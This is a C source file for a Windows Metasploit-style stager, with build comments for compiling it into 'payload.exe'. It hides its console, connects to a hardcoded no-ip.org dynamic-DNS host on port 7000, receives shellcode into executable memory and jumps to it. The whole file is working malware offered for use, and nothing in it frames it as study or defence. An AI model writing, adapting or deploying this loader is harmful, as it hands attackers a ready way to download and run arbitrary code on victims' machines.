#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
// REFERENCIA https://github.com/rsmudge/metasploit-loader
// Donwload gcc-4.9-win32 in http://sourceforge.net/projects/mingw-w64/files/latest/download
// gcc main.c -o temped.exe -lws2_32
// LINUX 
// apt-get install mingw32
// i586-mingw32msvc-gcc temp.c -o payload.exe -lws2_32

unsigned char server[] = "andhdslfocdyhd.no-ip.org";
unsigned char serverp[] = "7000";

void winsock_init() {
	WSADATA	wsaData;
	WORD 		wVersionRequested;
	wVersionRequested = MAKEWORD(2, 2);
	if (WSAStartup(wVersionRequested, &wsaData) < 0) {
		printf("ws2_32.dll is out of date.\n");
		WSACleanup();
		exit(1);
	}
}

void punt(SOCKET my_socket, char * error) {
	printf("Bad things: %s\n", error);
	closesocket(my_socket);
	WSACleanup();
	exit(1);
}

int recv_all(SOCKET my_socket, void * buffer, int len) {
	int    tret   = 0;
	int    nret   = 0;
	void * startb = buffer;
	while (tret < len) {
		nret = recv(my_socket, (char *)startb, len - tret, 0);
		startb += nret;
		tret   += nret;

		if (nret == SOCKET_ERROR)
			punt(my_socket, "Could not receive data");
	}
	return tret;
}

SOCKET wsconnect(char * targetip, int port) {
	struct hostent *		target;
	struct sockaddr_in 	sock;
	SOCKET 			my_socket;
	my_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (my_socket == INVALID_SOCKET)
		punt(my_socket, "Could not initialize socket");
	target = gethostbyname(targetip);
	if (target == NULL)
		punt(my_socket, "Could not resolve target");
	memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )
		punt(my_socket, "Could not connect to target");
	return my_socket;
}

int main(int argc, char * argv[]) {
	FreeConsole();
	ULONG32 size;
	char * buffer;
	void (*function)();
	winsock_init();
	SOCKET my_socket = wsconnect(server, atoi(serverp));
	int count = recv(my_socket, (char *)&size, 4, 0);
	if (count != 4 || size <= 0)
		punt(my_socket, "read a strange or incomplete length value\n");
	buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (buffer == NULL)
		punt(my_socket, "could not allocate buffer\n");
	buffer[0] = 0xBF;
	memcpy(buffer + 1, &my_socket, 4);
	count = recv_all(my_socket, buffer + 5, size);
	function = (void (*)())buffer;
	function();
	return 0;
}

